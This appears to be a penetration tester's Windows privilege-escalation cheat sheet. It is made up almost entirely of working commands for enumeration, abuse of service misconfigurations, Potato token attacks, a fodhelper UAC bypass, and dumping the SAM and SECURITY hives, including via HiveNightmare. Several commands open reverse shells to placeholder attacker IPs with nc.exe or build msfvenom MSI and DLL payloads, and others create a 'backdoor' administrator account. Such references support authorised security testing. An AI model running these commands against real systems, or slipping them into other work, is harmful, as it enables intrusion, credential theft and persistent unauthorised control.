---
title: "Windows Privilege Escalation Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - windows
  - privilege-escalation
  - local-admin
  - token-impersonation
---

# Windows Privilege Escalation Reference

Reference for Windows local privilege escalation including enumeration, service misconfigs, token abuse, and SAM extraction. See also: [[Windows-Persistence-Reference]], [[Mimikatz-Reference]], [[AD-Credential-Attacks]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#Enumeration Tools]]
- [[#Manual Enumeration]]
- [[#Service Misconfigurations]]
- [[#Unquoted Service Paths]]
- [[#AlwaysInstallElevated]]
- [[#Token Impersonation (Potato Attacks)]]
- [[#UAC Bypass]]
- [[#SAM / Credential Extraction]]
- [[#HiveNightmare (CVE-2021-36934)]]
- [[#DLL Hijacking]]
- [[#Scheduled Tasks]]
- [[#Registry AutoRun]]
- [[#Weak File Permissions]]
- [[#Quick Wins Checklist]]

---

## Enumeration Tools

```powershell
# winPEAS - comprehensive automated enum
.\winPEAS.exe
.\winPEAS.exe quiet    # Less output
.\winPEAS.exe systeminfo userinfo

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended  # More checks
Invoke-PrivescCheck -Report report.html -Format html

# Seatbelt
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=system
.\Seatbelt.exe TokenPrivileges NonstandardProcesses

# Watson (missing patches)
.\Watson.exe

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

---

## Manual Enumeration

### System Information

```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption, CSDVersion, OSArchitecture
hostname; whoami
```

### User and Group Enumeration

```powershell
whoami /all           # Current user + privs + groups
whoami /priv          # Token privileges
whoami /groups
net user              # Local users
net user jdoe         # Specific user details
net localgroup        # Local groups
net localgroup Administrators  # Members of Administrators
```

### Network Enumeration

```powershell
ipconfig /all
route print
arp -a
netstat -ano          # Active connections
netstat -ano | findstr LISTENING
netsh advfirewall show allprofiles
```

### Interesting Files

```powershell
# Credentials in common locations
dir C:\ /s /b 2>NUL | findstr /si password
dir C:\ /s /b 2>NUL | findstr /si secret
findstr /si password *.xml *.ini *.txt *.config
type C:\Windows\Panther\Unattend.xml 2>NUL
type C:\Windows\Panther\Unattend\Unattend.xml 2>NUL
type C:\Windows\System32\sysprep.inf 2>NUL
type C:\Windows\System32\sysprep\sysprep.xml 2>NUL

# Interesting registry keys
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Password"
reg query "HKEY_CURRENT_USER\Software\TightVNC\Server"
```

### Installed Applications & Patches

```powershell
wmic product get name, version
wmic qfe list full  # Installed patches

# Check for missing patches
wmic qfe get hotfixid | findstr /v "HotFixID"
```

### LAPS Check

```powershell
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
Get-ItemProperty "HKLM:\Software\Policies\Microsoft Services\AdmPwd" -Name AdmPwdEnabled
```

---

## Service Misconfigurations

### Finding Writable Services

```powershell
# PowerUp
Get-ModifiableServiceFile
Get-UnquotedService
Get-ModifiableService

# AccessChk (Sysinternals)
.\accesschk.exe -uwcqv "Everyone" * /accepteula
.\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
.\accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula

# sc.exe
sc qc <service_name>      # Query service config
sc query <service_name>   # Service status
sc queryex type= service state= all
```

### Exploiting Weak Service Permissions

```powershell
# Check permissions on service binary
.\accesschk.exe -uwv <service_binary_path>
icacls C:\path\to\service.exe

# Replace service binary
copy C:\path\evil.exe C:\path\to\service.exe

# Or create new admin user via PowerUp
Invoke-ServiceAbuse -Name <service_name> -Command "net user backdoor Password123! /add && net localgroup administrators backdoor /add"

# Restart service (if you have restart permissions)
sc stop <service_name>
sc start <service_name>
net stop <service_name>
net start <service_name>
```

---

## Unquoted Service Paths

If a service executable path contains spaces and is not quoted, Windows will try multiple locations. If we can write to an intermediate path, we can hijack execution.

```powershell
# Find unquoted paths
wmic service get pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-UnquotedService

# Example: C:\Program Files\Vuln App\service.exe
# Windows tries:
# C:\Program.exe     <- if writable, place payload here
# C:\Program Files\Vuln.exe
# C:\Program Files\Vuln App\service.exe
```

```powershell
# Check write permissions on path components
.\accesschk.exe -uwdv "C:\Program Files\" /accepteula
icacls "C:\Program Files"
```

---

## AlwaysInstallElevated

If both `AlwaysInstallElevated` registry keys are set to 1, MSI installers run with SYSTEM privileges.

```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerUp
Get-RegistryAlwaysInstallElevated
```

```bash
# Exploit - create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi

# Or add admin user
msfvenom -p windows/adduser USER=backdoor PASS=Password123! -f msi -o adduser.msi
```

```powershell
# Install MSI (triggers SYSTEM execution)
msiexec /quiet /qn /i C:\evil.msi
```

---

## Token Impersonation (Potato Attacks)

When you have `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common with service accounts), you can impersonate SYSTEM.

### Check Token Privileges

```powershell
whoami /priv
# Look for:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeDebugPrivilege
# SeLoadDriverPrivilege
```

### GodPotato (Most Universal - Windows Server 2012 - 2022, Windows 10/11)

```powershell
# Execute command as SYSTEM
.\GodPotato.exe -cmd "whoami"
.\GodPotato.exe -cmd "cmd /c whoami > C:\Windows\Temp\whoami.txt"

# Reverse shell
.\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd.exe <ATTACKER_IP> 4444"
```

### PrintSpoofer (Windows 10 and Server 2019)

```powershell
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "whoami"
.\PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe -e cmd <IP> 4444"
```

### SweetPotato / RottenPotato / JuicyPotato (Older)

```powershell
# JuicyPotato (Windows < 2019)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "-e cmd <IP> 4444" -t * -c "{CLSID}"

# SweetPotato
.\SweetPotato.exe -a "whoami"
```

---

## UAC Bypass

### Check UAC Level

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Bypass Methods

```powershell
# fodhelper.exe bypass (common)
Set-ItemProperty "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe"
Set-ItemProperty "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"

# Invoke-UACBypass (PowerSploit)
Invoke-UACBypass

# Metasploit
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_eventvwr
```

---

## SAM / Credential Extraction

```powershell
# Via registry (requires admin)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

```bash
# Parse offline (Linux)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# pypykatz
pypykatz registry --sam SAM SYSTEM
```

```powershell
# Mimikatz direct
lsadump::sam
lsadump::secrets
lsadump::cache

# Credential Manager
cmdkey /list
vaultcmd /list
```

---

## HiveNightmare (CVE-2021-36934)

Shadow copies of registry hives are readable by non-admin users on unpatched Windows 10.

```powershell
# Check if vulnerable
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX) is present

# Access shadow copies
vssadmin list shadows
```

```bash
# Copy registry hives from shadow copy
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Dump with impacket
impacket-secretsdump -sam sam -system system LOCAL
```

---

## DLL Hijacking

When an application loads a DLL from a user-writable location before the system location.

```powershell
# Find DLLs loaded from non-system paths
.\procmon.exe /quiet /minimized /nofilter  # Process Monitor GUI

# Look for "NAME NOT FOUND" + DLL paths in user-writable locations
# Common: C:\Python, C:\Perl, application directories

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o malicious.dll
# Copy to writable location with correct DLL name
```

---

## Scheduled Tasks

```powershell
# List all tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v 2>NUL | findstr /v "\Microsoft"

# PowerShell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# Check task binary permissions
schtasks /query /fo LIST /v | findstr "Run As\|Task To Run"
```

---

## Registry AutoRun

```powershell
# Check AutoRun entries
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on AutoRun binaries
# If writable, replace with malicious binary
```

---

## Weak File Permissions

```powershell
# Find writable files in system paths
.\accesschk.exe -uwsv C:\Windows /accepteula
.\accesschk.exe -uwsv "C:\Program Files" /accepteula

# PowerShell find world-writable
Get-ChildItem "C:\Program Files\" -Recurse -ErrorAction SilentlyContinue |
    Get-Acl | Where-Object { $_.Access |
    Where-Object { $_.IdentityReference -match "Everyone|Users" -and $_.FileSystemRights -match "Write|FullControl" }}
```

---

## Quick Wins Checklist

```
[ ] whoami /all - Check current privileges (SeImpersonate?)
[ ] systeminfo - OS version, missing patches
[ ] winPEAS/PrivescCheck - Automated scan
[ ] net user / net localgroup - User/group info
[ ] schtasks /query - Scheduled tasks with weak perms
[ ] wmic service get - Service binary paths (unquoted? writable?)
[ ] reg query - AlwaysInstallElevated
[ ] Credential files - unattend.xml, sysprep.xml, .config files
[ ] Registry password hunt
[ ] LAPS check
[ ] HiveNightmare check (icacls SAM)
[ ] Stored credentials (cmdkey /list, credential manager)
[ ] Service account permissions
```
